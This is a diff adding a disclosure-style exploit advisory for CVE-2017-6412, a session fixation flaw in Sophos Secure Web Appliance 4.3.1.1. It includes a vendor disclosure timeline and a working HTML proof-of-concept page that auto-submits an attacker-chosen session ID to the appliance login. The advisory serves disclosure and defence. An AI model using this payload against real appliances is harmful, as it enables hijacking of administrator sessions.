@@ -1,0 +1,71 @@
+# Exploit Title: [Sophos Secure Web Appliance Session Fixation Vulnerability]
+# Date: [28/02/2017]
+# Exploit Author: [SlidingWindow] , Twitter: @Kapil_Khot
+# Vendor Homepage: [https://www.sophos.com/en-us/products/secure-web-gateway.aspx]
+# Version: [Tested on Sophos Web Appliance version 4.3.1.1. Older versions may also be affected]
+# Tested on: [Sophos Web Appliance version 4.3.1.1]
+# CVE : [CVE-2017-6412]
+# Vendor Security Bulletin: http://wsa.sophos.com/rn/swa/concepts/ReleaseNotes_4.3.1.2.html
+
+==================
+#Product:-
+==================
+Sophos Secure Web Appliance is a purpose-built secure web gateway appliance which makes web protection simple. It provides advanced protection from today’s sophisticated web malware with lightning performance that won’t slow users down. You get full control and instant insights over all web activity on your network.
+
+==================
+#Vulnerabilities:-
+==================
+Session Fixation Vulnerability
+
+========================
+#Vulnerability Details:-
+========================
+
+#1. Session Fixation Vulnerability (CVE-2017-6412)
+
+A remote attacker could host a malicious page on his website that makes POST request to the victim’s Sophos Web Appliance to set the Session ID using STYLE parameter. The appliance does not validate if the Session ID sent by user/browser was issued by itself or fixed by an attacker.
+
+Also, the appliance does not invalidate pre-login Session IDs it issued earlier once user logs in successfully. It continues to use the same pre-login Session ID instead of invalidating it and issuing a new one.
+
+Note: An attacker would have to guess/know the IP address of the victim's device
+
+Proof-of-Concept:
+
+1.Visit the Sophos Login page to obtain pre-auth Session ID.
+
+2.Host following webpage on attacking machine with the Session ID obtained in #1. It can be changed a little bit.
+
+<html>
+<body>
+        <form name="Sophos_Login"action="https://192.168.253.147/index.php?c=login" method="POST" >
+                <input type="hidden" name="STYLE" value="Pre-Auth Session ID">
+        </form>
+
+        <script>
+                window.onload = function(){
+                        document.forms['Sophos_Login'].submit()
+                }
+        </script>
+</body>
+</html>
+
+3. Visit the above page another machine.
+
+4. You will be redirected to the login page, however Session ID will be the same.
+
+5. Log into the appliance and check the Session ID, it will be the same from #1.
+
+
+====================================
+#Vulnerability Disclosure Timeline:
+====================================
+
+28/02/2017: First email to disclose the vulnerability to the vendor
+28/02/2017: Vendor requested a vulnerability report
+28/02/2017: Report sent to vendor.
+28/02/2017: Vendor validated the report and confirmed the vulnerability
+01/03/2017: CVE MITRE assigned CVE-2017-6412 to this vulnerability
+03/03/2017: Vendor confirms that the fix is ready and is in the process of testing.
+09/03/2017: Vendor confirmed that the patch will be released on March 17 2017 and requested to hold off publishing the CVE until March 31 2017.
+17/03/2017: Vendor released the patch: http://wsa.sophos.com/rn/swa/concepts/ReleaseNotes_4.3.1.2.html
+31/03/2017: Published CVE as agreed by vendor
